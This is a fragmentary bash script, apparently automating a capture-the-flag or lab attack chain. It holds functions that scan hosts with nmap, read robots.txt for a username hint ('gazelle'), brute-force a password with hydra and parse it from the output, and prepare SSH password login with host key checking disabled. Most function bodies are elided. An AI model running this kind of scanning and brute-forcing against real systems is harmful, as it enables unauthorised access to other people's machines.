...
run_nmap() {
  ...
  [[ -n "$EXCLUDE_CSV" ]] && nmap_args+=( --exclude "$EXCLUDE_CSV" )

  nmap_args+=( -oG "$tmp" "$IP_RANGE" )

  nmap "${nmap_args[@]}" | grep -E "^(Host|Ports|#)" || true
...
fetch_robots() {
  ...
  # Expected content points to 'gazelle'
  local user
...
run_hydra() {
  ...
  local pass
  pass="$(echo "$hydra_out" | grep -oE 'login: [^[:space:]]+.*password: [^[:space:]]+' | awk '{print $NF}' | head -1)"

  if [[ -z "$pass" ]]; then
    pass="$(echo "$hydra_out" | grep -oE 'password: [^[:space:]]+' | awk '{print $2}' | head -1)"
  fi
...
run_ssh_enum() {
  ...
  local ssh_opts="-o StrictHostKeyChecking=no -o BatchMode=no -o PreferredAuthentications=password -p ${TARGET_SSH_PORT}"
